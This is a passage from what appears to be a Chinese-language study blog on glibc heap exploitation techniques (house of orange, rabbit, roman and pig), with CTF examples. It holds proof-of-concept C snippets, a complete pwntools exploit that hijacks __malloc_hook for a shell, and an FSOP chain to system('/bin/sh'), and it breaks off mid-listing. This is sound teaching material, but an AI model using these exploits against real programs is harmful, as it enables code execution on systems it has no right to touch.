已经不能满足用户申请堆内存的操作，需要执行 sysmalloc 来向系统申请更多的空间。 但是对于堆来说有 mmap 和 brk 两种分配方式，我们需要让堆以 <strong>brk</strong> 的形式拓展，之后原有的 top chunk 会被置于 unsorted bin 中。</p><p>综上，我们要实现 brk 拓展 top chunk，但是要实现这个目的需要绕过一些 libc 中的 check。 首先，malloc 的尺寸不能大于<code>mmp_.mmap_threshold</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if ((unsigned long)(nb) &gt;= (unsigned long)(mp_.mmap_threshold) &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max))</span><br></pre></td></tr></table></figure><p>如果所需分配的 chunk 大小大于 mmap 分配阈值，默认为 <strong>128K</strong>，并且当前进程使用 mmap() 分配的内存块小于设定的最大值，将使用 mmap() 系统调用直接向操作系统申请内存。</p><p><strong>在 sysmalloc 函数中存在对 top chunk size 的 check，如下</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">assert((old_top == initial_top(av) &amp;&amp; old_size == 0) ||</span><br><span class="line">     ((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">      prev_inuse(old_top) &amp;&amp;</span><br><span class="line">      ((unsigned long)old_end &amp; pagemask) == 0));</span><br></pre></td></tr></table></figure><p>这里检查了 top chunk 的合法性，如果第一次调用本函数，top chunk 可能没有初始化，所以可能 old_size 为 0。 如果 top chunk 已经初始化了，那么 top chunk 的大小<strong>必须大于等于 MINSIZE</strong>，因为 top chunk 中包含了 fencepost，所以 top chunk 的大小必须要大于 MINSIZE。其次 <strong>top chunk 必须标识前一个 chunk 处于 inuse 状态</strong>，并且 <strong>top chunk 的结束地址必定是页对齐的</strong>。此外 top chunk 除去 fencepost 的大小必定要小于所需 chunk 的大小，否则在_int_malloc() 函数中会使用 top chunk 分割出 chunk。</p><p>总结一下伪造的 top chunk size 的要求</p><ol><li><strong>伪造的 size 必须要对齐到内存页</strong></li><li>size 要大于等于 MINSIZE</li><li>size 要小于之后申请的 chunk size + MINSIZE</li><li>size 的 prev inuse 位必须为 1</li></ol><p>之后原有的 top chunk 就会执行<code>_int_free</code>从而顺利进入 unsorted bin 中。</p><h2 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h2><p><strong>2016 hiton house of orange</strong></p><h1 id="house-of-rabbit"><a href="#house-of-rabbit" class="headerlink" title="house of rabbit"></a>house of rabbit</h1><h2 id="概要-4"><a href="#概要-4" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong>House of rabbit 是一种伪造堆块的技术，一般运用在 fastbin attack 中，因为 unsorted bin 等其它的 bin 有更好的利用手段。</p><p><strong>利用条件:</strong></p><ol><li>可以修改 fastbin 的 fd 指针或 size </li><li>可以触发 malloc consolidate</li></ol><p><strong>利用效果:</strong>overlap</p><p><strong>有效版本:</strong>2.27以前</p><p><strong>失效原因:</strong>2.27及以后malloc_consolidate也开始进行检查了</p><h2 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h2><p>fastbin 中会把相同的 size 的被释放的堆块用一个单向链表管理，分配的时候会检查 size 是否合理，如果不合理程序就会异常退出。</p><p>而 house of rabbit 就利用了在 malloc consolidate 的时候 fastbin 中的堆块进行合并时 size 没有进行检查从而伪造一个假的堆块，为进一步的利用做准备</p><p> <code>POC 1</code>: modify the size of fastbin chunk</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">unsigned long* chunk1=malloc(0x40); //0x602000</span><br><span class="line">unsigned long* chunk2=malloc(0x40); //0x602050</span><br><span class="line">malloc(0x10);</span><br><span class="line">free(chunk1);</span><br><span class="line">free(chunk2);</span><br><span class="line"></span><br><span class="line">chunk1[-1]=0xa1; //modify chunk1 size to be 0xa1</span><br><span class="line">malloc(0x1000);  //allocate a large chunk, trigger malloc consolidate</span><br></pre></td></tr></table></figure><p><code>POC 2</code>:modify FD pointer</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">unsigned long* chunk1=malloc(0x40); //0x602000</span><br><span class="line">unsigned long* chunk2=malloc(0x100);//0x602050</span><br><span class="line"></span><br><span class="line">chunk2[1]=0x31; //fake chunk size 0x30</span><br><span class="line">chunk2[7]=0x21  //fake chunk&#x27;s next chunk</span><br><span class="line">chunk2[11]=0x21 //fake chunk&#x27;s next chunk&#x27;s next chuck</span><br><span class="line"></span><br><span class="line">free(chunk1);</span><br><span class="line">chuck1[0]=0x602060;// modify the fd of chunk1</span><br><span class="line">malloc(5000);// malloc a  big chunk to trigger malloc consolidate</span><br></pre></td></tr></table></figure><p>原理很简单，就是通过修改 fastbin chunk 的 size(如上面的 POC 1 所示) 直接构造 overlap chunk，或者修改 fd(如面的 POC 2 所示)，让它指向一个 fake chunk，触发 malloc consolidate 之后让这个 fake chunk 成为一个合法的 chunk。</p><h2 id="例题-2"><a href="#例题-2" class="headerlink" title="例题"></a>例题</h2><p><strong>HITB-GSEC-XCTF 2018 mutepig</strong></p><h1 id="house-of-roman"><a href="#house-of-roman" class="headerlink" title="house of roman"></a>house of roman</h1><h2 id="概要-5"><a href="#概要-5" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong>House of Roman是 fastbin attack(tcache也行) 和 Unsortbin attack 结合的一个用于绕过ASLR(利用 12-bit 的爆破)来达到获取 shell 的目的的技巧。</p><p><strong>利用条件:</strong></p><ol><li>UAF</li><li>任意大小chunk申请</li></ol><p><strong>利用效果:</strong>bypass ALSR</p><p><strong>有效版本:</strong>2.29以前</p><p><strong>失效原因:</strong>2.29及以后unsortedbin attack失效</p><h2 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a>原理</h2><p>作者给了一个demo,以此来学习该技术</p><p>checksec</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/hor&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>程序实现了增删改功能,其中free未置0,edit可以off-by-one</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./hor&quot;</span>,aslr=<span class="number">1</span>)</span><br><span class="line"><span class="comment">#raw_input()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>():</span><br><span class="line">p.recvuntil(<span class="string">&quot;3. Free&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size,idx</span>):</span><br><span class="line">menu()</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">menu()</span><br><span class="line">p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,data</span>):</span><br><span class="line">menu()</span><br><span class="line">p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">name = <span class="string">b&quot;A&quot;</span>*<span class="number">20</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">p.sendline(name)</span><br><span class="line"></span><br><span class="line">create(<span class="number">24</span>,<span class="number">0</span>)</span><br><span class="line">create(<span class="number">200</span>,<span class="number">1</span>)</span><br><span class="line">fake = <span class="string">b&quot;A&quot;</span>*<span class="number">104</span></span><br><span class="line">fake += p64(<span class="number">0x61</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,fake)</span><br><span class="line"></span><br><span class="line">create(<span class="number">101</span>,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">200</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">over = <span class="string">b&quot;A&quot;</span>*<span class="number">24</span></span><br><span class="line">over += <span class="string">b&quot;\x71&quot;</span></span><br><span class="line">edit(<span class="number">0</span>,over)</span><br><span class="line"></span><br><span class="line">create(<span class="number">101</span>,<span class="number">3</span>)</span><br><span class="line">create(<span class="number">101</span>,<span class="number">15</span>)</span><br><span class="line">create(<span class="number">101</span>,<span class="number">16</span>)</span><br><span class="line">create(<span class="number">101</span>,<span class="number">17</span>)</span><br><span class="line">create(<span class="number">101</span>,<span class="number">18</span>)</span><br><span class="line">create(<span class="number">101</span>,<span class="number">19</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">heap_po = <span class="string">b&quot;\x20&quot;</span></span><br><span class="line">edit(<span class="number">3</span>,heap_po)</span><br><span class="line"></span><br><span class="line">arena_po = <span class="string">b&quot;\xed\x8a&quot;</span></span><br><span class="line">edit(<span class="number">1</span>,arena_po)</span><br><span class="line"></span><br><span class="line"><span class="comment">#raw_input()</span></span><br><span class="line">create(<span class="number">101</span>,<span class="number">0</span>)</span><br><span class="line">create(<span class="number">101</span>,<span class="number">0</span>)</span><br><span class="line">create(<span class="number">101</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.interactive()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Control arena through 0.</span></span><br><span class="line"><span class="comment"># Now unsorted bin attack.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># First fix 0x71 freelist.</span></span><br><span class="line">free(<span class="number">15</span>)</span><br><span class="line">edit(<span class="number">15</span>,p64(<span class="number">0x00</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Fixed.</span></span><br><span class="line">create(<span class="number">200</span>,<span class="number">1</span>)</span><br><span class="line">create(<span class="number">24</span>,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">po = <span class="string">b&quot;B&quot;</span>*<span class="number">8</span></span><br><span class="line">po += <span class="string">b&quot;\x00\x8b&quot;</span></span><br><span class="line">dbg()</span><br><span class="line">edit(<span class="number">1</span>,po)</span><br><span class="line"></span><br><span class="line">create(<span class="number">200</span>,<span class="number">1</span>)</span><br><span class="line"><span class="comment">#4527a</span></span><br><span class="line">over = <span class="string">b&quot;R&quot;</span>*<span class="number">19</span></span><br><span class="line">over += <span class="string">b&quot;\x7a\x92\xf3&quot;</span></span><br><span class="line">edit(<span class="number">0</span>,over)</span><br><span class="line"></span><br><span class="line">create(<span class="number">200</span>,<span class="number">7</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">resp = p.recv(<span class="number">4</span>, timeout=<span class="number">6</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure><p>只有1/65536的概率成功</p><p>流程大致如下:</p><ol><li>将一个unsortedbin范围的chunk-A进行free使main_arena+88写入</li><li>修改A的size为0x71</li><li>挂两个0x71的chunk进入fastbin</li><li>部分写使A被挂入fastbin</li><li>第一次爆破写&amp;__malloc_hook-0x23到A的fd(1/16)</li><li>将__malloc_hook-0x23申请出来</li><li>修复fastbin</li><li>将一个chunk-B放入unsortedbin中,部分写bk为&amp;<em>_malloc_hook-0x10,利用unsorted攻击写入main_arena+88至&amp;\</em>_malloc_hook</li><li>第二次爆破写__malloc_hook为one_gadget(1/4096)</li></ol><p>还挺复杂的,主要就是部分写覆盖main_arena+88进行爆破</p><h1 id="house-of-pig"><a href="#house-of-pig" class="headerlink" title="house of pig"></a>house of pig</h1><h2 id="概要-6"><a href="#概要-6" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong>House of Pig 是一个将 Tcache Stash Unlink+ Attack 和 FSOP 结合的攻击，同时使用到了 Largebin Attack 进行辅助。主要适用于 libc 2.31 及以后的新版本 libc 并且程序中仅有 calloc 时。</p><p><strong>利用条件:</strong></p><ol><li>UAF</li><li>能执行 abort 流程或程序显式调用 exit 或程序能通过主函数返回</li></ol><p><strong>利用效果:</strong>在无malloc函数下利用tcache操作__free_hook</p><p><strong>适用情况:</strong>只有calloc函数,glibc231以上</p><p><strong>有效版本:</strong></p><h2 id="原理-6"><a href="#原理-6" class="headerlink" title="原理"></a>原理</h2><p>主要利用的函数为 <code>_IO_str_overflow</code></p><p>利用流程为</p><ol><li>进行一个 Tcache Stash Unlink+ 攻击，把地址 <code>__free_hook - 0x10</code> 写入 tcache_pthread_struct。由于该攻击要求 <code>__free_hook - 0x8</code> 处存储一个指向可写内存的指针，所以在此之前需要进行一次 large bin attack。</li><li>再进行一个 large bin attack，修改 <code>_IO_list_all</code> 为一个堆地址，然后在该处伪造 <code>_IO_FILE</code> 结构体。</li><li>通过伪造的结构体触发 <code>_IO_str_overflow</code> getshell。</li></ol><p>这是_IO_str_overflow的源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_str_overflow (FILE *fp, <span class="type">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> flush_only = c == EOF;</span><br><span class="line">  <span class="type">size_t</span> pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)</span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (<span class="type">size_t</span>) (_IO_blen (fp) + flush_only))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span></span><br><span class="line"><span class="keyword">return</span> EOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *new_buf;</span><br><span class="line">  <span class="type">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">  <span class="type">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">  <span class="type">size_t</span> new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">  <span class="keyword">if</span> (new_size &lt; old_blen)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">  new_buf = <span class="built_in">malloc</span> (new_size);</span><br><span class="line">  <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/*  __ferror(fp) = 1; */</span></span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (old_buf)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen);</span><br><span class="line">      <span class="built_in">free</span> (old_buf);</span><br><span class="line">      <span class="comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class="line">      fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="built_in">memset</span> (new_buf + old_blen, <span class="string">&#x27;\0&#x27;</span>, new_size - old_blen);</span><br><span class="line"></span><br><span class="line">  _IO_setb (fp, new_buf, new_buf + new_size, <span class="number">1</span>);</span><br><span class="line">  fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);</span><br><span class="line">  fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);</span><br><span class="line">  fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);</span><br><span class="line">  fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);</span><br><span class="line"></span><br><span class="line">  fp-&gt;_IO_write_base = new_buf;</span><br><span class="line">  fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!flush_only)</span><br><span class="line">    *fp-&gt;_IO_write_ptr++ = (<span class="type">unsigned</span> <span class="type">char</span>) c;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_str_overflow)</span><br></pre></td></tr></table></figure><p>重点看这部分</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line"><span class="type">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line"><span class="type">size_t</span> new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line"><span class="keyword">if</span> (new_size &lt; old_blen)</span><br><span class="line">  <span class="keyword">return</span> EOF;</span><br><span class="line">new_buf = <span class="built_in">malloc</span> (new_size);</span><br><span class="line"><span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/*  __ferror(fp) = 1; */</span></span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">if</span> (old_buf)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen);</span><br><span class="line">    <span class="built_in">free</span> (old_buf);</span><br><span class="line">    <span class="comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class="line">    fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>构造 FILE 结构的时候，重点是将其 <strong>vtable 由 _IO_file_jumps 修改为 _IO_str_jumps，那么当原本应该调用 IO_file_overflow 的时候，就会转而调用如下的 IO_str_overflow。</strong></p><p>而该函数是以传入的 FILE 地址本身为参数的，同时其中会连续调用 malloc,memcpy,free三个函数，且三个函数的参数又都可以被该 FILE 结构中的数据控制。</p><p>那么适当的构造 FILE 结构中的数据，就可以实现</p><ol><li>利用 IO_str_overflow 函数中的 <code>malloc</code> 申请出那个已经被放入到 tcache 链表的头部的包含 <code>__free_hook</code> 的 fake chunk；</li><li>紧接着可以将提前在堆上布置好的数据，通过 IO_str_overflow 函数中的<code>memcpy</code> 写入到刚刚申请出来的包含<code>__free_hook</code>的这个 chunk，从而能任意控制 <code>__free_hook</code> ，这里可以将其修改为 system函数地址；</li><li>最后调用 IO_str_overflow 函数中的 <code>free</code> 时，就能够触发 __free_hook ，同时还能在提前布置堆上数据的时候，使其以字符串 “/bin/sh\x00” 开头，那么最终就会执行 system(“/bin/sh”)。</li></ol><p>FILE结构的参数应满足</p><ol><li>_IO_NO_WRITES标志为false,_IO_USER_BUF标志为false</li><li>fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base <strong>&gt;=</strong> fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base - 1</li><li>fp-&gt;_IO_buf_base指向存储有”/bin/sh”和system地址的chunk,old_buf中的内容复制到new_buf时应注意对应</li><li>fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base合适</li></ol><h2 id="例题-3"><a href="#例题-3" class="headerlink" title="例题"></a>例题</h2><p><strong>xctf2021-house of pig</strong></p><p>checksec</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/pig&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>程序只使用calloc,这就意味着不会使用tcache</p><p>主要的漏洞是在改变猪猪的时候，备份和更新结构体时未对 des_exist_sign[24] 数组更新</p><p>也就是说一只猪猪释放了一个chunk后,切换成另一只猪猪再切换回来,就能uaf</p><p>c++反编译出来的代码看不太懂</p><p>暂时先这样</p><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span 